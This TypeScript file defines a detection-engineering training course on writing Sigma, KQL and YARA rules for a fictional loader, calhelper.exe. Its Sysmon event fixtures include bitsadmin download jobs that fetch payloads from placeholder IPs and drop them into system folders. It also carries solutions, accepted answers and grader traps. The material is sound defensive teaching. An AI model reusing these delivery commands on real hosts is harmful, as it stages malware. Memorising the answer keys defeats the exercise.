/**
 * Room 107 "Operation Rule and Sign" (sigma-yara-rule-authoring): Pelham Instruments.
 * The EDR pulled calhelper.exe off PEL-BLD-03, the build host next to the firmware
 * signing key. The first YARA rule for it matched 412 ordinary files and was pulled
 * within the hour. Tatiana Ogunleye signs off every rule that reaches production.
 *
 * In room order (the readings teach Sigma first, then YARA):
 *   mx1 Sigma for how it arrived     (after Reading 3: bitsadmin delivery over process-creation events)
 *   mx2 same rule, two SIEMs         (after Reading 4: KQL twin on dataset "rule-and-sign", then the hits)
 *   mx3 let the corpus vote          (after Reading 6: strings on calhelper.exe, then the YARA rule)
 *   mx4 boss: nothing left to read   (fix mode: the pulled rule, on stripped builds; count and ceiling)
 *
 * Every file is a synthetic spec (src/lib/missions/yara/samples.ts): a minimal PE
 * header, the authored strings and byte patterns, non-printable filler. Nothing is
 * real malware and nothing is downloadable. The hidden files and events in each
 * rule step are server-only and punish a rule fitted to the visible set.
 */
import type { MissionEvent, MissionSample, MissionTask } from "../types";
import type { SampleSpec } from "../yara/samples";

const MENTOR = "Tatiana Ogunleye, Detection Content Author";

// ─── The corpus ───────────────────────────────────────────────────────────────

const KB = 1024;
/** The loader's string-decode step: xor eax, ecx / rol eax, 5. Ordinary hash routines use the same bytes. */
const ROT = "33 C1 C1 C0 05";
const FMT = "id=%s&st=%d&ck=%08x";
const TYPO = "conect fail retry";
const PIPE = "\\\\.\\pipe\\pcal_ctl";

type Str = NonNullable<SampleSpec["strings"]>[number];
const a = (value: string, count = 1): Str => ({ value, enc: "ascii", count });
const w = (value: string, count = 1): Str => ({ value, enc: "wide", count });
/** What nearly every Windows program carries: the pulled rule's three strings. */
const COMMON: Str[] = [a("VirtualAlloc"), a("kernel32.dll"), a("http://")];

function file(name: string, label: "bad" | "good", kb: number, seed: number, rot: number, strings: Str[], extra: Partial<SampleSpec> = {}, note?: string): MissionSample {
  return {
    name, label, note,
    spec: { name, size: Math.round(kb * KB), seed, strings, hex: rot > 0 ? [{ hex: ROT, count: rot }] : [], ...extra },
  };
}

/** A calhelper build that still carries its readable strings. */
function build(name: string, kb: number, seed: number, rot: number, parts: { fmt?: boolean; typo?: "both" | "ascii" | "fixed" | false; pipe?: "wide" | "ascii" | false; c2: string; tag: string; dll?: boolean }, note: string): MissionSample {
  const s: Str[] = [...COMMON, a(parts.c2), a(parts.tag)];
  if (parts.fmt !== false) s.push(a(FMT));
  if (parts.typo === "both" || parts.typo === undefined) s.push(a(TYPO), w(TYPO));
  else if (parts.typo === "ascii") s.push(a(TYPO));
  else if (parts.typo === "fixed") s.push(a("connect fail retry"));
  if (parts.pipe === "wide" || parts.pipe === undefined) s.push(w(PIPE));
  else if (parts.pipe === "ascii") s.push(a(PIPE));
  return file(name, "bad", kb, seed, rot, s, parts.dll ? { dll: true } : {}, note);
}

/** The five builds the DCA team holds, PEL-BLD-03's first. */
const BAD_VISIBLE: MissionSample[] = [
  build("calhelper.exe", 84, 10701, 14, { c2: "203.0.113.58", tag: "nov-04-b" }, "Pulled off PEL-BLD-03 on Monday."),
  build("calhelper_q7.exe", 96, 10702, 12, { c2: "203.0.113.58", tag: "oct-28-a" }, "From the PEL-QA-07 quarantine."),
  build("calhelper_lite.exe", 167, 10703, 9, { c2: "198.51.100.23", tag: "nov-02-c" }, "The build with fewer hidden strings."),
  build("pcalsvc.exe", 131, 10704, 11, { c2: "203.0.113.77", tag: "nov-04-a" }, "Same family, service name."),
  build("calhelper64.dll", 212, 10705, 9, { fmt: false, c2: "198.51.100.140", tag: "oct-30-b", dll: true }, "The DLL build."),
];

/** Two more builds the grader holds back (server-only). */
const BAD_HIDDEN: MissionSample[] = [
  build("calhelper_v2.exe", 118, 10706, 10, { typo: "fixed", c2: "203.0.113.91", tag: "nov-06-a" }, "A newer build: the author fixed the typo in the error string."),
  build("calhelper32.exe", 74, 10707, 13, { typo: "ascii", pipe: "ascii", c2: "198.51.100.77", tag: "nov-01-d" }, "A 32-bit build that stores its strings as ascii only."),
];

/** Pelham's own software and the tools on its build hosts. */
const GOOD_VISIBLE: MissionSample[] = [
  file("PelhamLabelPrint.exe", "good", 300, 20701, 0, [...COMMON, a("Pelham Label Service")]),
  file("vpnhelper.exe", "good", 410, 20702, 13, [...COMMON, a("tunnel keepalive %u")]),
  file("remoteassist_agent.exe", "good", 236, 20703, 10, [...COMMON, w("\\\\.\\pipe\\ra_agent")]),
  file("licclient.exe", "good", 120, 20704, 8, [...COMMON, a("id=%s&lic=%s")]),
  file("fwflash.exe", "good", 190, 20705, 7, [a("VirtualAlloc"), a("kernel32.dll"), a("flash sector %04x")]),
  file("crcsum.exe", "good", 72, 20706, 4, [a("kernel32.dll"), a("crc32 mismatch")]),
  file("balsync.exe", "good", 95, 20707, 0, [...COMMON, a("balance sync ok")]),
];

/** Goodware the grader holds back (server-only), including the near misses. */
const GOOD_HIDDEN: MissionSample[] = [
  file("CalibrationStudio_Setup.exe", "good", 18 * 1024, 20711, 22, [...COMMON, a("Pelham Calibration Studio")], {}, "The 18 MB Calibration Studio installer: its unpacker runs the same 5-byte step 22 times."),
  file("tlshelper.dll", "good", 640, 20712, 16, [a("VirtualAlloc"), a("kernel32.dll"), a("TLS handshake failed")], { dll: true }, "A TLS library helper: its hash routine repeats the same bytes 16 times."),
  file("pcal_service.exe", "good", 150, 20713, 0, [...COMMON, w("\\\\.\\pipe\\pcal_svc")], {}, "Pelham's real calibration service. Its pipe name starts the same way as the loader's."),
  file("telemetry_agent.exe", "good", 88, 20714, 6, [...COMMON, a("id=%s&st=%d&v=%s")], {}, "A telemetry agent whose check-in format starts like the loader's."),
  file("syncagent.exe", "good", 140, 20715, 5, [...COMMON, a("connect fail retry")], {}, "A sync agent with the correctly spelled error string."),
  file("lims_connector.exe", "good", 260, 20716, 9, [...COMMON, a("LIMS session open")]),
  file("backupagent.exe", "good", 520, 20717, 0, [...COMMON, a("snapshot complete")]),
  file("pdfprev.dll", "good", 98, 20718, 3, [a("VirtualAlloc"), a("kernel32.dll"), a("PDF preview")], { dll: true }),
  file("scaledrv_ctl.exe", "good", 64, 20719, 0, [a("kernel32.dll"), a("scale port %d")]),
  file("pelham_update.exe", "good", 340, 20720, 11, [...COMMON, a("update channel stable")]),
];

const YARA_SKELETON = String.raw`rule PEL_Calhelper_Loader
{
    meta:
        author = "Pelham DCA"
        description = "calhelper.exe loader family"

    strings:
        // one line per string you picked, plus anything else the rule needs

    condition:
        // what must be true of a file for this rule to fire
}
`;

const YARA_SOLUTION = String.raw`rule PEL_Calhelper_Loader
{
    meta:
        author = "Pelham DCA"
        description = "calhelper.exe loader family: check-in format, error typo, control pipe, decode loop"

    strings:
        $fmt  = "id=%s&st=%d&ck=%08x" ascii
        $typo = "conect fail retry" ascii wide
        $pipe = "\\\\.\\pipe\\pcal_ctl" ascii wide
        $rot  = { 33 C1 C1 C0 05 }

    condition:
        uint16(0) == 0x5A4D and filesize < 300KB
        and 2 of ($fmt, $typo, $pipe)
        and #rot >= 6
}
`;

// ─── mx3: let the corpus vote ─────────────────────────────────────────────────

export const RULE_AND_SIGN_YARA: MissionTask = {
  type: "mission",
  id: "sigyara-mx3",
  heading: "Let the Corpus Vote",
  mentor: MENTOR,
  story: "Now the file itself. The first YARA rule for calhelper.exe matched 412 ordinary files and was pulled within the hour, which is why Tatiana no longer lets anyone start from a rule. She has the sample open on the bench, next to five known builds of the family and a share of Pelham's own software. \"Don't start from the rule. Start from the strings, and let the corpus vote: who else has this, and what would it cost the author to change it?\"",
  objective: "Pick the strings worth a rule, then write the YARA rule and run it on both sets.",
  samples: [...BAD_VISIBLE, ...GOOD_VISIBLE],
  steps: [
    {
      kind: "strings", id: "pick", xp: 40,
      prompt: "These are the strings of **calhelper.exe**, as `strings` or FLOSS prints them (offset, encoding, value). Beside each one is the corpus vote: in how many known-bad builds and in how many goodware files it appears. **Tick at least three strings a rule can stand on**: none in goodware, and in at least 4 of the known-bad builds.",
      sample: 0, minPicks: 3, minBad: 4,
      hint: "Two questions per string: does ordinary software carry it too, and would the next build change it for free?",
      where: "Sort by the goodware column first and drop every row above 0. Of what is left, drop the rows that only one or two builds share: an address and a campaign label are set per build.",
      worked: "Three strings pass both tests:\n- `id=%s&st=%d&ck=%08x`: the check-in format. The server parses the same format, so changing it means changing both ends.\n- `conect fail retry`: a typo in an error message (ascii and UTF-16LE). No honest program shares it.\n- `\\\\.\\pipe\\pcal_ctl`: the named pipe the controller connects to.\n\n`VirtualAlloc`, `kernel32.dll`, `http://` and the DOS stub sit in most goodware. `203.0.113.58` and `nov-04-b` sit in only one or two builds: they burn in a day.",
      debrief: "A string earns a place in a rule twice over: nothing ordinary carries it, and the author would pay to change it. The corpus counts answer the first question; the kind of string (a protocol, a habit, a value set per build) answers the second.",
    },
    {
      kind: "rule", id: "write", xp: 100, language: "yara",
      prompt: "Write the rule. **It must match all five known-bad builds and none of the goodware**, and the grader also runs it on files it holds back: more of Pelham's software and newer builds of the family. Use the strings you picked. The loader also runs the 5-byte decode step `33 C1 C1 C0 05` once per hidden string; ordinary hash routines use the same bytes.",
      starter: YARA_SKELETON,
      hidden: { samples: [...BAD_HIDDEN, ...GOOD_HIDDEN] },
      hint: "One build lacks one of your strings, and the next build may lack another. Ask for some of them, not all of them, and declare each string in every encoding the builds use.",
      where: "Open the match table for the files you got wrong. The DLL build has no check-in format, so `all of them` misses it. Text in a Windows binary is often UTF-16LE: the typo and the pipe need `wide` (and `ascii` for builds that store them as single bytes). Write the pipe with escaped backslashes: `\"\\\\\\\\.\\\\pipe\\\\pcal_ctl\"`.",
      worked: "```\n" + YARA_SOLUTION + "```\n`2 of (...)` survives a build that drops or fixes one string. `ascii wide` catches both encodings. The header check, the size ceiling and the decode count keep the rule on small Windows executables that really run the loop.",
      debrief: "A rule built on several strings the author would pay to change, asked for as `2 of`, survives the next build. Declaring both encodings and testing on a set the author has not seen is what separates a rule that holds from one that only fits the five files on the bench.",
      solution: { source: YARA_SOLUTION },
    },
  ],
};

// ─── mx4 (boss): the builds with nothing left to read (fix mode) ──────────────

/** A stripped build: every readable string encrypted, only the imports and the decode loop left. */
const stripped = (name: string, kb: number, seed: number, rot: number, note: string, dll = false): MissionSample =>
  file(name, "bad", kb, seed, rot, [...COMMON], dll ? { dll: true } : {}, note);

const STRIPPED_VISIBLE: MissionSample[] = [
  stripped("q7_drop_a.bin", 84, 30701, 14, "Stripped build from the PEL-QA-07 quarantine."),
  stripped("q7_drop_b.bin", 96, 30702, 12, "Stripped build from the PEL-QA-07 quarantine."),
  stripped("q7_drop_c.bin", 167, 30703, 9, "Stripped build with fewer hidden strings."),
  stripped("q7_drop_d.bin", 131, 30704, 11, "Stripped build, service variant."),
];

const STRIPPED_HIDDEN: MissionSample[] = [
  stripped("q7_drop_e.dll", 212, 30705, 9, "The stripped DLL build: the biggest of the family.", true),
  stripped("q7_drop_f.bin", 150, 30706, 10, "A stripped build found later on PEL-ENG-22."),
];

const PULLED_RULE = String.raw`rule PEL_Calhelper_Generic
{
    meta:
        author = "night shift"
        description = "calhelper stripped builds"

    strings:
        $a = "VirtualAlloc"
        $b = "http://"
        $c = "kernel32.dll"

    condition:
        2 of them
}
`;

const STRIPPED_SOLUTION = String.raw`rule PEL_Calhelper_Loader
{
    meta:
        author = "Pelham DCA"
        description = "calhelper family: readable builds by their strings, stripped builds by count and ceiling"

    strings:
        $fmt  = "id=%s&st=%d&ck=%08x" ascii
        $typo = "conect fail retry" ascii wide
        $pipe = "\\\\.\\pipe\\pcal_ctl" ascii wide
        $rot  = { 33 C1 C1 C0 05 }

    condition:
        uint16(0) == 0x5A4D and (
            2 of ($fmt, $typo, $pipe)
            or (#rot >= 9 and filesize < 225KB)
        )
}
`;

export const RULE_AND_SIGN_FIX: MissionTask = {
  type: "mission",
  id: "sigyara-mx4",
  heading: "The Builds With Nothing Left to Read",
  mentor: MENTOR,
  story: "The firmware signs at five, and one rule is still not signed: the one that was pulled. Tatiana puts it on the screen. \"It wasn't lazy, it was desperate. The night shift wrote it for the builds out of the PEL-QA-07 quarantine, and in those every readable string is encrypted. Your strings aren't there. What is left is the imports, which every program has, and the decode loop, which a lot of programs have. Count and ceiling remove different crowds. Fix it, don't bin it.\"",
  objective: "Rewrite the pulled rule so it catches the stripped builds and none of Pelham's software.",
  samples: [...STRIPPED_VISIBLE, ...GOOD_VISIBLE],
  steps: [
    {
      kind: "rule", id: "fix", xp: 80, language: "yara",
      prompt: "This is the rule that matched 412 ordinary files. **Make it match every stripped build and no goodware**, here and on the files the grader holds back. The stripped builds keep only the imports and the decode step `33 C1 C1 C0 05`. Run it first and read the match table: every goodware file it hits tells you why.",
      starter: PULLED_RULE,
      hidden: { samples: [...STRIPPED_HIDDEN, ...GOOD_HIDDEN] },
      hint: "How often a file runs the step and how big the file is are two different filters: each one removes goodware the other lets through.",
      where: "Read `#rot` and the size of every goodware file your draft matched. Set the count at the smallest count a stripped build has. Put the ceiling where the looping goodware starts, not where the visible bad files stop: the biggest build of the family is not on the bench.",
      worked: "```\n" + STRIPPED_SOLUTION + "```\nThe count has to be at least 9: the licence client runs the step 8 times, and the leanest stripped builds run it exactly 9 times. The ceiling has to sit above the 212 KB DLL build and below the 236 KB remote support agent, which runs the step 10 times. A ceiling at the visible maximum (167 KB) misses the DLL build; a round 300 KB catches the support agent. Keeping the string branch makes it one rule for the whole family.",
      debrief: "A count separates a loop from an accident, and a ceiling separates a small dropped loader from a big program that happens to loop. Neither does the job alone. Set a threshold in the gap between the nearest bad file and the nearest goodware, not at the edge of what you happen to hold.",
      solution: { source: STRIPPED_SOLUTION },
    },
  ],
};

// ─── mx1: Sigma for how it arrived ────────────────────────────────────────────

const P = String.raw;

/** Deterministic fake hex (fictional hashes). */
function hex(seed: number, len: number): string {
  let x = seed >>> 0, out = "";
  while (out.length < len) {
    x = (Math.imul(x ^ (x >>> 15), 0x2c1b3c6d) + 0x9e3779b9) >>> 0;
    out += x.toString(16).padStart(8, "0");
  }
  return out.slice(0, len).toUpperCase();
}

const SYS = P`C:\Windows\System32`;
const BITS = `${SYS}\\bitsadmin.exe`;
const CMD = `${SYS}\\cmd.exe`;
const PWSH = `${SYS}\\WindowsPowerShell\\v1.0\\powershell.exe`;
const CMD_LINE = P`"C:\Windows\system32\cmd.exe"`;

interface Proc { host: string; user: string; image: string; ofn: string; cmd: string; parent: string; parentCmd: string; time: string; integrity?: string }

/** A Sysmon Event ID 1 record in Sigma's process_creation field names. */
function ev(id: string, label: "bad" | "good", p: Proc, seed: number, note?: string): MissionEvent {
  return {
    id, label, note,
    fields: {
      EventID: 1,
      UtcTime: p.time,
      Computer: `${p.host}.pelham.example`,
      ProcessId: 2000 + ((seed * 37) % 6000),
      Image: p.image,
      OriginalFileName: p.ofn,
      CommandLine: p.cmd,
      CurrentDirectory: p.image.slice(0, p.image.lastIndexOf("\\") + 1),
      User: p.user,
      IntegrityLevel: p.integrity ?? "High",
      Hashes: `SHA256=${hex(seed, 64)},IMPHASH=${hex(seed + 7, 32)}`,
      ParentImage: p.parent,
      ParentCommandLine: p.parentCmd,
    },
  };
}

const EVENTS_VISIBLE: MissionEvent[] = [
  ev("evt-01", "bad", { host: "PEL-BLD-03", user: P`PELHAM\svc_build`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 02:11:48.207",
    cmd: P`bitsadmin /transfer upd /download /priority high http://198.51.100.58/c.bin C:\ProgramData\Pelham\calhelper.exe`,
    parent: CMD, parentCmd: P`cmd.exe /c C:\ProgramData\Pelham\stage.cmd` }, 401),
  ev("evt-02", "good", { host: "PEL-IT-02", user: P`PELHAM\adm.kreyes`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 07:02:15.533",
    cmd: "bitsadmin /list /allusers", parent: CMD, parentCmd: CMD_LINE }, 402),
  ev("evt-03", "bad", { host: "PEL-QA-07", user: P`PELHAM\qa.runner`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 07:40:02.918", integrity: "Medium",
    cmd: P`bitsadmin /TRANSFER pcal /download http://203.0.113.58/u/pcal.dat C:\Users\Public\pcal.dat`,
    parent: `${SYS}\\wscript.exe`, parentCmd: P`wscript.exe C:\Users\qa.runner\AppData\Local\Temp\inv_2611.js` }, 403),
  ev("evt-04", "good", { host: "PEL-BLD-03", user: P`NT AUTHORITY\SYSTEM`, image: `${SYS}\\svchost.exe`, ofn: "svchost.exe", time: "2026-11-09 08:00:31.004", integrity: "System",
    cmd: P`C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS`, parent: `${SYS}\\services.exe`, parentCmd: P`C:\Windows\system32\services.exe` }, 404),
  ev("evt-05", "good", { host: "PEL-IT-02", user: P`PELHAM\adm.kreyes`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 08:14:56.120",
    cmd: `bitsadmin /info "Pelham Firmware Sync" /verbose`, parent: CMD, parentCmd: CMD_LINE }, 405),
  ev("evt-06", "bad", { host: "PEL-ENG-22", user: P`PELHAM\r.adebayo`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 09:26:40.771", integrity: "Medium",
    cmd: P`bitsadmin.exe -transfer job1 http://198.51.100.58/c.bin C:\Users\r.adebayo\AppData\Local\Temp\c.bin`,
    parent: PWSH, parentCmd: P`powershell.exe -NoProfile -WindowStyle Hidden -File C:\Users\r.adebayo\AppData\Local\Temp\u.ps1` }, 406),
  ev("evt-07", "good", { host: "PEL-ENG-31", user: P`PELHAM\m.lindgren`, image: PWSH, ofn: "PowerShell.EXE", time: "2026-11-09 10:03:12.449", integrity: "Medium",
    cmd: P`powershell.exe -NoProfile -Command Start-BitsTransfer -Source http://fw.pelham.example/fw/2611.bin -Destination D:\fw\2611.bin`,
    parent: P`C:\Windows\explorer.exe`, parentCmd: P`C:\Windows\Explorer.EXE` }, 407),
  ev("evt-08", "bad", { host: "PEL-BLD-03", user: P`PELHAM\svc_build`, image: P`C:\ProgramData\Pelham\bts.exe`, ofn: "bitsadmin.exe", time: "2026-11-09 11:47:05.362",
    cmd: P`bts.exe /transfer x /download http://198.51.100.58/c2.bin C:\ProgramData\Pelham\c2.bin`,
    parent: CMD, parentCmd: P`cmd.exe /c C:\ProgramData\Pelham\stage.cmd` }, 408),
  ev("evt-09", "good", { host: "PEL-IT-02", user: P`PELHAM\adm.kreyes`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 12:30:44.810",
    cmd: "bitsadmin /reset /allusers", parent: CMD, parentCmd: CMD_LINE }, 409),
];

/** Server-only: the variants the next intrusion will use, and the lookalikes a loose rule catches. */
const EVENTS_HIDDEN: MissionEvent[] = [
  ev("hid-01", "bad", { host: "PEL-ENG-31", user: P`PELHAM\m.lindgren`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 13:05:19.004", integrity: "Medium",
    cmd: P`bitsadmin /Transfer   upd2  /download http://203.0.113.58/c2.bin C:\ProgramData\c2.bin`, parent: CMD, parentCmd: "cmd.exe /c start /min upd.cmd" }, 501,
  "Mixed case and extra spaces between the switch and the job name."),
  ev("hid-02", "bad", { host: "PEL-QA-07", user: P`PELHAM\qa.runner`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 13:41:52.637", integrity: "Medium",
    cmd: "bitsadmin \u2013transfer upd /download http://198.51.100.58/c.bin " + P`C:\Users\Public\c.bin`, parent: `${SYS}\\wscript.exe`, parentCmd: P`wscript.exe C:\Users\Public\r.js` }, 502,
  "The switch starts with an en dash, which bitsadmin accepts like a hyphen."),
  ev("hid-03", "bad", { host: "PEL-ENG-22", user: P`PELHAM\r.adebayo`, image: P`C:\Users\Public\svcupd.exe`, ofn: "bitsadmin.exe", time: "2026-11-09 14:12:08.255", integrity: "Medium",
    cmd: P`svcupd.exe /transfer j /download /priority foreground http://203.0.113.58/c.bin C:\Users\Public\c.bin`, parent: CMD, parentCmd: "cmd.exe /c svcupd.cmd" }, 503,
  "Another renamed copy, in another folder."),
  ev("hid-04", "good", { host: "PEL-IT-04", user: P`PELHAM\adm.kreyes`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 09:10:00.118",
    cmd: "bitsadmin /list /verbose", parent: CMD, parentCmd: CMD_LINE }, 504),
  ev("hid-05", "good", { host: "PEL-ENG-22", user: P`NT AUTHORITY\SYSTEM`, image: `${SYS}\\svchost.exe`, ofn: "svchost.exe", time: "2026-11-09 06:00:12.902", integrity: "System",
    cmd: P`C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS`, parent: `${SYS}\\services.exe`, parentCmd: P`C:\Windows\system32\services.exe` }, 505,
  "The BITS service itself, running Windows Update's jobs."),
  ev("hid-06", "good", { host: "PEL-IT-02", user: P`PELHAM\adm.kreyes`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 12:31:10.400",
    cmd: `bitsadmin /complete "Pelham Firmware Sync"`, parent: CMD, parentCmd: CMD_LINE }, 506),
  ev("hid-07", "good", { host: "PEL-IT-04", user: P`PELHAM\adm.kreyes`, image: P`C:\Tools\bitsadmin_report.exe`, ofn: "bitsadmin_report.exe", time: "2026-11-09 15:20:33.071",
    cmd: P`bitsadmin_report.exe -transfer-log http://intranet.pelham.example/bits/report`, parent: CMD, parentCmd: CMD_LINE }, 507,
  "IT's reporting tool: its name only starts like bitsadmin, and -transfer-log is one of its own switches."),
  ev("hid-08", "good", { host: "PEL-IT-02", user: P`PELHAM\adm.kreyes`, image: BITS, ofn: "bitsadmin.exe", time: "2026-11-09 05:30:00.016",
    cmd: P`bitsadmin /transfer fwsync /download /priority normal \\PEL-FS-01\firmware\2611.bin D:\fw\2611.bin`, parent: CMD, parentCmd: CMD_LINE }, 508,
  "IT's documented firmware sync, from Pelham's own file share, not from the web."),
];

const SIGMA_STARTER = P`title: Bitsadmin Download Job
id: 6d3c2a1e-4b7f-4e09-9a51-2f8c7d6e5b40
status: experimental
description: A BITS download job started with bitsadmin, as used to deliver calhelper.exe to PEL-BLD-03.
author: Pelham DCA
date: 2026-11-10
tags:
  - attack.t1197
  - attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains: 'bitsadmin /transfer'
  condition: selection
falsepositives:
  - Administrators scripting downloads with bitsadmin
level: high
`;

const SIGMA_SOLUTION = P`title: Bitsadmin Download Job
id: 6d3c2a1e-4b7f-4e09-9a51-2f8c7d6e5b40
status: experimental
description: A BITS download job started with bitsadmin (or a renamed copy) that fetches from the web.
author: Pelham DCA
date: 2026-11-10
tags:
  - attack.t1197
  - attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\bitsadmin.exe'
    - OriginalFileName: 'bitsadmin.exe'
  selection_cli:
    CommandLine|windash|contains|all:
      - ' -transfer '
      - 'http'
  condition: all of selection_*
falsepositives:
  - Administrators scripting downloads from the internet with bitsadmin
level: high
`;

export const RULE_AND_SIGN_SIGMA: MissionTask = {
  type: "mission",
  id: "sigyara-mx1",
  heading: "Sigma for How It Arrived",
  mentor: MENTOR,
  story: "On Monday the EDR pulled calhelper.exe off PEL-BLD-03, the build host next to Pelham's firmware signing key, and the first YARA rule written for it was pulled within the hour. Tatiana starts somewhere else: how the file got there. A BITS download job, started from a staging script in the small hours. \"A file rule catches one build. A rule on the delivery catches the next one too, whatever it drops. The night shift's draft is a single phrase. Make it hold.\"",
  objective: "Write the Sigma rule for the bitsadmin delivery and run it on the build hosts' process events.",
  events: EVENTS_VISIBLE,
  steps: [
    {
      kind: "rule", id: "sigma", xp: 100, language: "sigma",
      prompt: "These are Sysmon process-creation events (Event ID 1) from Monday on Pelham's build and engineering hosts, in Sigma's `process_creation` field names. **Fire on every malicious download job and on nothing else**, here and on the events the grader holds back. The draft below matches one phrase, exactly as it was typed once.",
      starter: SIGMA_STARTER,
      hidden: { events: EVENTS_HIDDEN },
      hint: "Two questions, in two blocks: is this bitsadmin, whatever the file is called, and is it a download job from the web, however the switch is typed?",
      where: "Compare `Image` and `OriginalFileName` on evt-08: a renamed copy keeps the name it was built with. Compare the switch on evt-01, evt-03 and evt-06: Windows tools accept `/` and `-`, and Sigma's `windash` modifier expands one into the other. Two things must appear together on the command line: that needs `|all`.",
      worked: "```yaml\n" + SIGMA_SOLUTION + "```\n`selection_img` is a list of two maps, so either one is enough: the path ends in `\\bitsadmin.exe`, or the PE header still names `bitsadmin.exe` after a rename. `selection_cli` needs both items (`|all`); `windash` tries the switch with `-`, `/` and the dash lookalikes, and the spaces around it stop `-transfer-log` from counting. `all of selection_*` needs both blocks on one event. The admin's `/list`, `/info` and `/reset`, the BITS service itself and the firmware sync from the internal share all stay quiet.",
      debrief: "A delivery rule ages better than a file rule: describe the tool by what it is (`OriginalFileName` survives a rename) and the action by its shape (`windash`, `|all`), never by one command line as it was typed once.",
      solution: { source: SIGMA_SOLUTION },
    },
  ],
};

// ─── mx2: same rule, two SIEMs ────────────────────────────────────────────────

const KQL_REFERENCE = P`DeviceProcessEvents
| where FolderPath endswith @"\bitsadmin.exe" or ProcessVersionInfoOriginalFileName =~ "bitsadmin.exe"
| where ProcessCommandLine contains " /transfer " or ProcessCommandLine contains " -transfer " or ProcessCommandLine contains " ` + "–" + P`transfer "
| where ProcessCommandLine contains "http"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ReportId`;

export const RULE_AND_SIGN_KQL: MissionTask = {
  type: "mission",
  id: "sigyara-mx2",
  heading: "Same Rule, Two SIEMs",
  mentor: MENTOR,
  story: "The Sigma rule goes into the detection repository, but tonight's hunt runs in Defender's advanced hunting, and there is no converter on the build network. Tatiana slides the console across. \"Write the KQL by hand. If your query and your rule don't return the same rows, one of them is wrong, and I sign neither. Then tell me how far it went.\"",
  objective: "Hand-write the KQL twin of the bitsadmin rule, get exactly its hits, then read the spread.",
  dataset: "rule-and-sign",
  steps: [
    {
      kind: "kql", id: "twin", xp: 80,
      prompt: "Monday's process starts from Pelham's hosts are in `DeviceProcessEvents`. **Return exactly the events your Sigma rule fires on**, one row per event, with its `ReportId`. Defender's columns are not Sigma's field names, and KQL has no `windash`.",
      focusTables: ["DeviceProcessEvents"],
      starter: "DeviceProcessEvents\n// selection_img, then selection_cli, in this table's column names\n",
      hint: "Translate block by block. Each Sigma block becomes one `where`; a list of maps inside a block becomes `or`.",
      where: "The mapping: `Image` is `FolderPath` (the full path here), `OriginalFileName` is `ProcessVersionInfoOriginalFileName`, `CommandLine` is `ProcessCommandLine`. KQL's `contains` ignores case, like Sigma. `windash` has to be written out: one `contains` per dash the switch can start with, and one of the jobs uses a dash you can't type on a UK keyboard.",
      answer: {
        reference: [KQL_REFERENCE],
        mode: "values", keys: ["ReportId"],
        traps: [
          { ifQuery: "^(?![\\s\\S]*OriginalFileName)", ifRowsFewerThan: 7, say: "Two of the download jobs ran under another file name. Sigma's `OriginalFileName` lives in this table as `ProcessVersionInfoOriginalFileName`, and a rename doesn't change it." },
          { ifRowsFewerThan: 7, say: "Some of the rule's hits are missing. Look at the command lines of bitsadmin rows you dropped: case, extra spaces, and the character in front of `transfer`." },
          { ifRowsMoreThan: 7, say: "Some of your rows are bitsadmin doing admin work (list, info, reset, monitor) or PowerShell's own BITS cmdlet. The rule needs bitsadmin and the download switch and a web address, on one event." },
        ],
      },
      worked: "```\n" + KQL_REFERENCE + "\n```\nEach Sigma block is one `where`. `selection_img` is a list of two maps, so it becomes `or`. `|windash` becomes one `contains` per dash, with the spaces kept so the switch must stand alone; `contains` ignores case like Sigma does. `|all` becomes a second `where` (an `and`). The seven rows are exactly what the Sigma rule fires on.",
      debrief: "Converting by hand shows what a pipeline does for you: field names change, modifiers turn into operators, and some modifiers (like `windash`) expand into several. If the two engines disagree on one row, the difference is a mapping mistake you would otherwise have shipped.",
    },
    {
      kind: "fields", id: "spread", xp: 40,
      prompt: "Read your result. Tatiana needs two facts for the sign-off note.",
      fields: [
        {
          id: "devices", label: "How many different devices ran a malicious download job?", format: "int", placeholder: "a number",
          accept: ["4"],
          coach: "Count the distinct `DeviceName` values in your rows, not the rows: some hosts ran more than one job.",
        },
        {
          id: "server", label: "Which server address served the most download jobs (block it first)?", format: "ip", placeholder: "an IP address",
          accept: ["198.51.100.58"],
          coach: "Every job fetches from an address in its command line. Count the jobs per address.",
          traps: [{ value: "203.0.113.58", say: "That address served three jobs. Count again: one address served more, including the renamed copy on PEL-BLD-03." }],
        },
      ],
      hint: "Add `| summarize dcount(DeviceName)` or `extract()` the address and count by it.",
      where: "`extract(@\"https?://([0-9.]+)/\", 1, ProcessCommandLine)` pulls the address out of each command line; `summarize count() by` it gives the answer to the second question.",
      worked: "**4 devices**: PEL-BLD-03, PEL-QA-07, PEL-ENG-22 and PEL-ENG-31.\n**198.51.100.58** served four jobs (PEL-BLD-03 twice, PEL-ENG-22, and the en-dash job on PEL-QA-07); 203.0.113.58 served three.",
      debrief: "A detection is finished when its hits are read: how far it spread and what to block first are what turn a matched rule into a sign-off.",
    },
  ],
};

export const RULE_AND_SIGN_MISSIONS: MissionTask[] = [RULE_AND_SIGN_SIGMA, RULE_AND_SIGN_KQL, RULE_AND_SIGN_YARA, RULE_AND_SIGN_FIX];
